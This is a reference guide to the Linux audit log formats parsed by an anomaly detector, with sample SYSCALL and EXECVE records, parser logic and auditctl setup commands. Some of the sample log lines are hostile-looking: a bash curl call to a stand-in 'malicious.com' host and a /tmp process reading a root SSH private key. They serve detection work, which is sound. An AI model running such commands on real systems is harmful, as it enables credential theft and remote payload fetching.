# Audit Log Format Reference

This document explains the audit log formats that the anomaly detector parses.

## Example Audit Events

### SYSCALL Event (File Open)

```
type=SYSCALL msg=audit(1707901845.123456):arch=c000003e syscall=2 success=yes exit=3 a0=ffffff9c a1=0 a2=0 a3=0 items=1 ppid=1234 pid=5678 uid=1000 gid=1000 euid=1000 egid=1000 fsuid=1000 fsgid=1000 tty=pts/0 ses=1 comm="cat" exe="/bin/cat" key=(null)
```

**Decoded**:
- `type=SYSCALL`: System call audit event
- `msg=audit(1707901845.123456)`: Timestamp (Unix seconds + microseconds)
- `syscall=2`: System call number (2 = open)
- `success=yes`: Operation succeeded
- `uid=1000`: User ID performing operation
- `gid=1000`: Group ID
- `pid=5678`: Process ID
- `ppid=1234`: Parent Process ID
- `comm="cat"`: Process name (comm = command)
- `exe="/bin/cat"`: Full executable path

### SYSCALL Event (File Read)

```
type=SYSCALL msg=audit(1707901850.234567):arch=c000003e syscall=0 success=yes exit=1024 a0=4 a1=7fffffffeb80 a2=1000 a3=0 items=0 ppid=1234 pid=5678 uid=1000 gid=1000 euid=1000 egid=1000 fsuid=1000 fsgid=1000 tty=pts/0 ses=1 comm="bash" exe="/bin/bash"
```

**Decoded**:
- `syscall=0`: System call 0 = read
- `exit=1024`: Return value (1024 bytes read)
- `exe="/bin/bash"`: bash shell

### SYSCALL Event (File Open with Path)

```
type=SYSCALL msg=audit(1707901850.345678):arch=c000003e syscall=257 success=yes exit=4 a0=ffffff9c a1=555555554321 a2=0 a3=0 items=1 ppid=1234 pid=5678 uid=1000 gid=1000 euid=1000 egid=1000 fsuid=1000 fsgid=1000 tty=pts/0 ses=1 comm="cp" exe="/bin/cp"
type=CWD cwd="/home/user"
type=PATH name="/etc/passwd" inode=12345 dev=800 mode=100644 ouid=0 ogid=0 rdev=00 nametype=NORMAL cap_fp=0000000000000000 cap_fe=0000000000000000 cap_fp=0000000000000000 cap_fi=0000000000000000
```

**Decoded**:
- `syscall=257`: openat syscall
- `name="/etc/passwd"`: File path being opened (from PATH line)

### EXECVE Event (Process Execution)

```
type=EXECVE msg=audit(1707901855.456789):argc=3 a0="/bin/bash" a1="-c" a2="/usr/bin/curl http://malicious.com/data" uid=1000
```

**Decoded**:
- `type=EXECVE`: Process execution event
- `argc=3`: Number of arguments
- `a0="/bin/bash"`: Program executed
- `a1="-c"`: First argument
- `a2="/usr/bin/curl..."`: Second argument
- `uid=1000`: User ID executing

## Syscall Numbers

Common syscalls monitored:

| Number | Name | Purpose | Parser Handles |
|--------|------|---------|-----------------|
| 0 | read | Read from file descriptor | ✓ |
| 1 | write | Write to file descriptor | - |
| 2 | open | Open file | ✓ |
| 3 | close | Close file descriptor | - |
| 4 | stat | Get file stats | - |
| 5 | fstat | Get file stats (fd) | - |
| 257 | openat | Open file relative to dir | ✓ |
| ...execve... | execve | Execute program | ✓ |

## Log Line Parsing

The parser extracts these key fields:

```go
msg=audit(TIMESTAMP.SEQ)
uid=UID
exe="PROCESS_PATH"
name="FILE_PATH"
syscall=SYSCALL_NUMBER
success=yes/no
```

## Example Real-World Logs

### Normal File Access

```
type=SYSCALL msg=audit(1707901901.111111):arch=c000003e syscall=2 success=yes exit=5 a0=ffffff9c a1=80000 a2=0 a3=0 items=1 ppid=3456 pid=7890 uid=1000 gid=1000 euid=1000 egid=1000 fsuid=1000 fsgid=1000 tty=pts/1 ses=2 comm="less" exe="/usr/bin/less"
type=PATH name="/var/log/syslog" inode=98765 dev=801 mode=100644 ouid=0 ogid=4 rdev=00 nametype=NORMAL
```

### Suspicious Rapid File Access

```
type=SYSCALL msg=audit(1707901902.111112):arch=c000003e syscall=2 success=yes exit=6 a0=ffffff9c a1=80000 a2=0 a3=0 items=1 ppid=4567 pid=8901 uid=0 gid=0 euid=0 egid=0 fsuid=0 fsgid=0 tty=pts/2 ses=3 comm="scanner" exe="/tmp/scanner"
type=PATH name="/root/.ssh/id_rsa" inode=54321 dev=802 mode=100600 ouid=0 ogid=0 rdev=00 nametype=NORMAL
```

### Process Execution

```
type=EXECVE msg=audit(1707901903.111113):argc=1 a0="/bin/sh" uid=1000
```

## Fields Extracted by Parser

| Field | Source | Example | Usage |
|-------|--------|---------|-------|
| timestamp | msg=audit(X.Y) | 1707901845 | Time window assignment |
| uid | uid=X | 1000 | User tracking |
| process | exe="X" | /bin/cat | Activity characterization |
| filepath | name="X" | /etc/passwd | Anomaly context |
| eventtype | syscall=X | 2, 0, 257 | Feature engineering |
| success | success=yes/no | yes | Ignore failures |

## Parser Logic

### Event Classification

```
Parse message timestamp and UID from msg=audit(...)

If contains "type=SYSCALL":
    Extract uid and exe
    If syscall=2 or syscall=257 (open/openat):
        Extract name="..."
        Classify as "open"
    If syscall=0 (read):
        Classify as "read"

If contains "type=EXECVE":
    Extract uid and a0="..." (program)
    Classify as "execve"
```

### Audit Rules to Generate These Events

To enable these audit events, use:

```bash
# Monitor file opens
sudo auditctl -a always,exit -S open,openat -F auid>=1000 -F auid!=-1 -k file_open

# Monitor file reads
sudo auditctl -a always,exit -S read -F auid>=1000 -F auid!=-1 -k file_read

# Monitor process execution
sudo auditctl -a always,exit -S execve -F auid>=1000 -F auid!=-1 -k exec

# Make permanent
echo "
-a always,exit -S open,openat -F auid>=1000 -F auid!=-1 -k file_open
-a always,exit -S read -F auid>=1000 -F auid!=-1 -k file_read
-a always,exit -S execve -F auid>=1000 -F auid!=-1 -k exec
" | sudo tee -a /etc/audit/rules.d/anomaly.rules

# Restart auditd
sudo systemctl restart auditd
```

## Log Size Reference

- **Typical log rate**: 100-1000 events/second (depends on system activity)
- **Log size**: ~1KB per event (compressed, ~50 bytes per event)
- **Rotation**: Typically daily or when file exceeds size limit
- **Example**: 10M events/day × 1KB = 10GB/day (uncompressed)

## Debugging Logs

To see raw audit events:

```bash
# Tail real-time events
sudo tail -f /var/log/audit/audit.log | grep SYSCALL

# Search for specific process
sudo grep 'comm="bash"' /var/log/audit/audit.log

# Search for specific user
sudo grep 'uid=1000' /var/log/audit/audit.log

# Convert timestamp to readable format
sudo grep SYSCALL /var/log/audit/audit.log | \
    head -1 | \
    sed 's/.*msg=audit(\([0-9]*\)\..*/\1/' | \
    xargs date -d @
```

---

This reference helps understand how the anomaly detector processes audit logs and what information is available for analysis.
